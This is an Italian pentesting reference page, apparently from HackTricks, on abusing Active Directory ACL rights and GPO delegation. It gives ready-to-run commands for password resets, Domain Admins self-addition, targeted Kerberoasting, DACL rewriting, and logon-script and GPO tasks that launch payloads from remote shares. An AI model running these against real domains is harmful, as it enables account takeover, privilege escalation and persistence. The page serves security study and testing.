# Abuso di Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è principalmente un riassunto delle tecniche tratte da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per maggiori dettagli, consultare gli articoli originali.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Questo privilegio concede a un attaccante il controllo completo su un account utente target. Una volta confermati i diritti `GenericAll` usando il comando `Get-ObjectAcl`, un attaccante può:

- **Cambiare la password dell'account target**: usando `net user <username> <password> /domain`, l'attaccante può resettare la password dell'utente.
- **Targeted Kerberoasting**: Assegna un SPN all'account dell'utente per renderlo kerberoastable, poi usa Rubeus e targetedKerberoast.py per estrarre e tentare di crackare gli hash del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile ad ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Diritti GenericAll su un gruppo**

Questo privilegio consente a un attaccante di manipolare le appartenenze al gruppo se dispone dei diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il distinguished name del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Da Linux puoi anche sfruttare BloodyAD per aggiungerti a gruppi arbitrari quando detieni GenericAll/Write membership su di essi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente accesso WinRM sugli host che rispettano quel gruppo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Il possesso di questi privilegi su un oggetto computer o su un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: Consente di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: Usare questa tecnica per impersonare un account computer o utente sfruttando i privilegi per creare shadow credentials.

## **WriteProperty on Group**

Se un utente ha `WriteProperty` diritti su tutti gli oggetti di un gruppo specifico (es., `Domain Admins`), può:

- **Add Themselves to the Domain Admins Group**: Raggiungibile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo permette l'escalation di privilegi all'interno del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Questo privilegio permette agli aggressori di aggiungere se stessi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente l'appartenenza ai gruppi. L'uso della seguente sequenza di comandi consente l'auto-aggiunta:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio simile, consente agli attaccanti di aggiungere direttamente se stessi ai gruppi modificando le proprietà dei gruppi se possiedono il diritto `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono effettuate con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Mantenere il `ExtendedRight` su un utente per `User-Force-Change-Password` permette di reimpostare la password senza conoscere quella attuale. La verifica di questo diritto e il suo sfruttamento possono essere eseguiti tramite PowerShell o altri strumenti da riga di comando, offrendo diversi metodi per resettare la password di un utente, incluse sessioni interattive e one-liners per ambienti non interattivi. I comandi variano da semplici invocazioni PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori d'attacco.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sul gruppo**

Se un attaccante scopre di avere i diritti `WriteOwner` su un gruppo, può cambiare la proprietà del gruppo a proprio favore. Questo è particolarmente impattante quando il gruppo in questione è `Domain Admins`, poiché cambiare il proprietario permette un controllo più ampio sugli attributi del gruppo e sulla membership. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e quindi l'uso di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che tramite nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Questa autorizzazione permette a un attaccante di modificare le proprietà di un utente. In particolare, con accesso `GenericWrite`, l'attaccante può cambiare il percorso dello script di logon di un utente per eseguire uno script dannoso al momento del logon dell'utente. Ciò si ottiene usando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target in modo che punti allo script dell'attaccante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo prevede la creazione di un oggetto di credenziale, il suo utilizzo per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche all'appartenenza tramite comandi PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possedere un oggetto AD e avere i privilegi `WriteDACL` su di esso consente a un attacker di concedersi i privilegi `GenericAll` sull'oggetto. Questo viene realizzato tramite la manipolazione di ADSI, permettendo il pieno controllo sull'oggetto e la possibilità di modificare le sue appartenenze ai gruppi. Nonostante ciò, esistono limitazioni nel cercare di sfruttare questi privilegi usando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicazione nel dominio (DCSync)**

L'attacco DCSync sfrutta permessi di replicazione specifici nel dominio per impersonare un Domain Controller e sincronizzare dati, incluse le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, permettendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Delega GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delega GPO

L'accesso delegato per gestire Group Policy Objects (GPOs) può rappresentare rischi di sicurezza significativi. Per esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione GPO, potrebbe avere privilegi come **WriteProperty**, **WriteDacl**, e **WriteOwner**. Questi permessi possono essere abusati per scopi maligni, come evidenziato usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerare i permessi GPO

Per identificare GPO mal configurati, i cmdlet di PowerSploit possono essere concatenati. Questo permette di scoprire i GPO che un utente specifico può gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer con una data policy applicata**: È possibile risolvere a quali computer si applica uno specifico GPO, aiutando a comprendere la portata dell'impatto potenziale. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policy applicate a un dato computer**: Per vedere quali policy sono applicate a un particolare computer, possono essere utilizzati comandi come `Get-DomainGPO`.

**OU con una data policy applicata**: Identificare le Organizational Units (OU) interessate da una determinata policy può essere fatto usando `Get-DomainOU`.

Puoi anche usare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare i GPO e trovare problemi in essi.

### Abuso GPO - New-GPOImmediateTask

GPO mal configurati possono essere sfruttati per eseguire codice, ad esempio creando un task pianificato immediato. Questo può essere usato per aggiungere un utente al gruppo degli amministratori locali sulle macchine interessate, elevando significativamente i privilegi:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Il GroupPolicy module, se installato, permette la creazione e il collegamento di nuove GPOs e l'impostazione di preferenze, come valori del registro, per eseguire backdoors sui computer interessati. Questo metodo richiede che la GPO venga aggiornata e che un utente acceda al computer affinché l'esecuzione avvenga:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offre un metodo per abusare di GPOs esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuovi GPOs. Questo strumento richiede la modifica di GPOs esistenti o l'uso di strumenti RSAT per crearne di nuovi prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'aggiornamento delle policy

Gli aggiornamenti delle GPO avvengono tipicamente circa ogni 90 minuti. Per accelerare questo processo, soprattutto dopo aver effettuato una modifica, sul computer target può essere eseguito il comando `gpupdate /force` per forzare un aggiornamento immediato delle policy. Questo comando assicura che eventuali modifiche alle GPO vengano applicate senza attendere il prossimo ciclo di aggiornamento automatico.

### Dietro le quinte

Ispezionando gli Scheduled Tasks di una specifica GPO, come la `Misconfigured Policy`, si può confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o scalare privilegi.

La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli del scheduled task — inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i scheduled task sono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.

### Utenti e gruppi

Le GPO permettono anche la manipolazione delle appartenenze a utenti e gruppi sui sistemi target. Modificando direttamente i file di policy Users and Groups, un attaccante può aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Ciò è possibile tramite la delega dei permessi di gestione delle GPO, che consente la modifica dei file di policy per includere nuovi utenti o cambiare le appartenenze ai gruppi.

Il file di configurazione XML per Users and Groups delinea come queste modifiche vengono implementate. Aggiungendo voci a questo file, utenti specifici possono ricevere privilegi elevati sui sistemi interessati. Questo metodo offre un approccio diretto all'escalation di privilegi tramite la manipolazione delle GPO.

Inoltre, possono essere considerate ulteriori tecniche per eseguire codice o mantenere persistenza, come l'uso di script di logon/logoff, la modifica di chiavi di registro per autorun, l'installazione di software tramite file .msi, o la modifica delle configurazioni dei servizi. Queste tecniche forniscono diverse vie per mantenere l'accesso e controllare i sistemi target tramite l'abuso delle GPO.

## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
